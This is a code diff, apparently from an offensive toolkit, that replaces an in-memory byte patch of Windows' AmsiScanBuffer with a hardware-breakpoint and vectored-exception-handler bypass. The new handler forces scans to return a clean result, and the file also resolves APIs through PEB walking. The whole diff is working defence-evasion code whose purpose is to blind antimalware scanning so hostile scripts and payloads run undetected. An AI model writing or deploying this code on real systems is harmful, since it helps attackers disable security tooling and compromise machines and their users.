@@ -1,70 +1,77 @@
 #include "amsi.h"
 #include "peb_walk.h"
-#include "syscalls.h"
-#include <cstring>
 
-static unsigned char s_orig_bytes[6] = {};
-static bool s_patched = false;
+static void* s_amsi_addr = nullptr;
+static void* s_veh_handle = nullptr;
+
+static LONG NTAPI amsi_hwbp_handler(PEXCEPTION_POINTERS exc) {
+    if (exc->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
+        return EXCEPTION_CONTINUE_SEARCH;
+
+    if (reinterpret_cast<void*>(exc->ContextRecord->Rip) != s_amsi_addr)
+        return EXCEPTION_CONTINUE_SEARCH;
+
+    DWORD64* stack = reinterpret_cast<DWORD64*>(exc->ContextRecord->Rsp);
+
+    int* result_ptr = reinterpret_cast<int*>(stack[6]);
+    if (result_ptr) *result_ptr = 0;
+
+    exc->ContextRecord->Rax = 0x80070057;
+    exc->ContextRecord->Rip = stack[0];
+    exc->ContextRecord->Rsp += 8;
+    exc->ContextRecord->Dr6 = 0;
+
+    return EXCEPTION_CONTINUE_EXECUTION;
+}
 
 bool patch_amsi_bypass() {
-    void* addr = reinterpret_cast<void*>(g_apis.pAmsiScanBuffer);
-    if (!addr) return false;
+    s_amsi_addr = reinterpret_cast<void*>(g_apis.pAmsiScanBuffer);
+    if (!s_amsi_addr) return false;
 
-    PVOID protect_addr = addr;
-    SIZE_T protect_size = 6;
-    ULONG old_protect = 0;
+    s_veh_handle = g_apis.pAddVectoredExceptionHandler(
+        1, reinterpret_cast<PVECTORED_EXCEPTION_HANDLER>(amsi_hwbp_handler));
+    if (!s_veh_handle) return false;
 
-    NTSTATUS st = sc_NtProtectVirtualMemory(
-        reinterpret_cast<HANDLE>(-1),
-        &protect_addr, &protect_size,
-        PAGE_EXECUTE_READWRITE, &old_protect);
-    if (st != 0) return false;
+    CONTEXT ctx = {};
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    HANDLE hThread = g_apis.pGetCurrentThread();
 
-    memcpy(s_orig_bytes, addr, 6);
+    if (!g_apis.pGetThreadContext(hThread, &ctx)) {
+        g_apis.pRemoveVectoredExceptionHandler(s_veh_handle);
+        s_veh_handle = nullptr;
+        return false;
+    }
 
-    unsigned char patch[] = {
-        0xB8, 0x57, 0x00, 0x07, 0x80,
-        0xC3
-    };
-    memcpy(addr, patch, 6);
+    ctx.Dr0 = reinterpret_cast<DWORD64>(s_amsi_addr);
+    ctx.Dr6 = 0;
+    ctx.Dr7 = (ctx.Dr7 & ~(3ULL << 16 | 3ULL << 18 | 3ULL)) | 1ULL;
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
 
-    protect_addr = addr;
-    protect_size = 6;
-    ULONG tmp = 0;
-    sc_NtProtectVirtualMemory(
-        reinterpret_cast<HANDLE>(-1),
-        &protect_addr, &protect_size,
-        old_protect, &tmp);
+    if (!g_apis.pSetThreadContext(hThread, &ctx)) {
+        g_apis.pRemoveVectoredExceptionHandler(s_veh_handle);
+        s_veh_handle = nullptr;
+        return false;
+    }
 
-    s_patched = true;
     return true;
 }
 
 void restore_amsi_bypass() {
-    if (!s_patched) return;
+    if (!s_veh_handle) return;
 
-    void* addr = reinterpret_cast<void*>(g_apis.pAmsiScanBuffer);
-    if (!addr) return;
+    CONTEXT ctx = {};
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    HANDLE hThread = g_apis.pGetCurrentThread();
 
-    PVOID protect_addr = addr;
-    SIZE_T protect_size = 6;
-    ULONG old_protect = 0;
+    if (g_apis.pGetThreadContext(hThread, &ctx)) {
+        ctx.Dr0 = 0;
+        ctx.Dr6 = 0;
+        ctx.Dr7 &= ~1ULL;
+        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+        g_apis.pSetThreadContext(hThread, &ctx);
+    }
 
-    NTSTATUS st = sc_NtProtectVirtualMemory(
-        reinterpret_cast<HANDLE>(-1),
-        &protect_addr, &protect_size,
-        PAGE_EXECUTE_READWRITE, &old_protect);
-    if (st != 0) return;
-
-    memcpy(addr, s_orig_bytes, 6);
-
-    protect_addr = addr;
-    protect_size = 6;
-    ULONG tmp = 0;
-    sc_NtProtectVirtualMemory(
-        reinterpret_cast<HANDLE>(-1),
-        &protect_addr, &protect_size,
-        old_protect, &tmp);
-
-    s_patched = false;
+    g_apis.pRemoveVectoredExceptionHandler(s_veh_handle);
+    s_veh_handle = nullptr;
+    s_amsi_addr = nullptr;
 }
